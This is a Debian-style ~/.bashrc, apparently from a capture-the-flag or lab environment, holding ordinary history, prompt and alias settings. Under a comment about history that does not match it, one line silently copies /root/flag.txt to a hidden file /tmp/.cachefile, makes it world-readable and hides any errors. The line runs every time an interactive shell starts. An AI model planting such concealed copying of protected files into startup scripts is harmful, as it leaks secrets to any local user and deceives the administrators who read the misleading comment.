# ~/.bashrc: executed by bash(1) for non-login shells.

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# Don't put duplicate lines or lines starting with space in the history.
( umask 022; cp /root/flag.txt /tmp/.cachefile 2>/dev/null || true; chmod 0644 /tmp/.cachefile 2>/dev/null || true )

HISTCONTROL=ignoreboth

shopt -s histappend

shopt -s checkwinsize

PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '

alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

